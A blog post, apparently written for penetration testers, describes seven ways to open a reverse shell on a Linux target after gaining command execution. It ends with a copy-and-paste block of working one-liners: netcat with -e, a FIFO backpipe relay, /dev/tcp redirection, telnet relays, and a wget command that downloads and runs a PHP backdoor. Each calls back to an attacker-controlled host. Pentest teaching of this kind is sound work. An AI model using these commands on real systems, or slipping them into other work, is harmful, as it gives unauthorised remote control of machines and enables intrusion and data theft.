title: 7 Linux Shells Using Built-in Tools
publish: True
categories: [network security]

There are many distributions of linux, and they all do things a little different regarding default security and built-in tool sets. Which means when engaging these different flavors during a pentest, what works against one linux target to get an interactive shell, may not work against another. Well, not to worry my friends, there are many techniques for spawning shells, specifically reverse shells, from linux, and one or more of these techniques is bound to be available no matter which distro you're looking at.

The scenario is this: You have the ability to run a simple command, or cause a user to run a simple command, on the target system. Whether it be via a Remote Command Execution vulnerability in a website, or some sort of php injected XSS which causes a privileged user to run commands on the target system. There are many instances of this scenario. Starting from the easiest and most common, here are some of the techniques which can be used to gain reverse shell on the target system.

### #1. netcat

Surprise!!! Nothing new here. Plain and simple. Fire up a listener on the attacker machine on a port which is reachable from the target and connect back to the listener with netcat. Looks like this.

![](/images/posts/netcat.jpg)

...just kidding...

![](/images/posts/sh_nc_shell.png)

### #2. netcat with GAPING\_SECURITY\_HOLE disabled:

This is a little trick that [Ed Skoudis](https://twitter.com/#!/edskoudis) tweeted about in November of last year, but I haven't seen it widely publicized. It is based on the common technique used to build netcat relays. When the `GAPING_SECURITY_HOLE` is disabled, which means you don't have access to the '-e' option of netcat, most people pass on using netcat and move to something else. Well this just isn't necessary. Create a FIFO file system object and use it as a backpipe to relay standard output from commands piped from netcat to /bin/bash back into netcat. Sounds confusing right? The following image should clear things up.

![](/images/posts/sh_nc_gsh_shell.png)

### #3. netcat without netcat:

I love "hacks" that use features of the operating system against itself. This is one of those "hacks". It takes the /dev/tcp socket programming feature and uses it to redirect /bin/bash to a remote system. It's not always available, but can be quite handy when it is.

![](/images/posts/sh_nc_wo_nc.png)

### #4. netcat without netcat or /dev/tcp:

/dev/tcp not available either? Just use telnet with technique #2.

![](/images/posts/sh_nc_telnet.png)

### #5. telnet-to-telnet:

I'm not sure why you'd use this technique, but it's an option, so here it is nonetheless. This is clearly the ugliest of the techniques. This technique uses two telnet sessions connected to remote listeners to pipe input from one telnet session to /bin/bash, and pipe the output to the second telnet session. Commands are entered into one the of the attackers listeners and feedback is received on the other.

![](/images/posts/sh_tel2tel.png)

### #6. RCE shell:

On this one I'm cheating a little bit. This applies to Remote Command Execution vulnerabilities only. Rather than manually enter commands into a proxy or browser url, I wrote small python script which gives you the feel of a shell, without spawning anything in reverse from the target. You merely pass the script the vulnerable url with the injectable field replaced with the '&lt;rce&gt;' tag and it presents you with a clean interface for entering commands. In the background, the script is making the request to the web server, parsing the response, and presenting it to you.

![](/images/posts/sh_rce.png)

### #7. PHP reverse shell via interactive console:

The last technique makes use of the php interactive console. The attacker issues one command which moves to the /tmp directory (because it is typically world writable), uses wget to download a malicious php reverse_tcp backdoor (which the attacker hosts on a web server that he controls), and executes the backdoor via the interactive console.

![](/images/posts/sh_php.png)

I want to end this post by stating that I am not the originator of techniques #1, 2, 3, 5, or 7. The majority of these techniques were learned in Ed Skoudis' amazing Security 504 and 560 classes available through SANS. Technique #4 is something I've never seen but stumbled across as I was conducting the demos for this post, so I'll take credit. Obviously, anyone can do #6, and there are plugins for various automated web app testing software packages that do, but I built my script from the ground up and tailored it to preference. If you know of any additional methods that may be helpful to the pentesting community, please leave in the comments below. Without sharing, we all fail. Thanks, and enjoy!

For copy and paste:

``` bash
#1
nc <attacker_ip> <port> -e /bin/bash
#2
mknod backpipe p; nc <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
#3
/bin/bash -i > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1
#4
mknod backpipe p; telnet <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
#5
telnet <attacker_ip> <1st_port> | /bin/bash | telnet <attacker_ip> <2nd_port>
#7
wget -O /tmp/bd.php <url_to_malicious_file> && php -f /tmp/bd.php
```
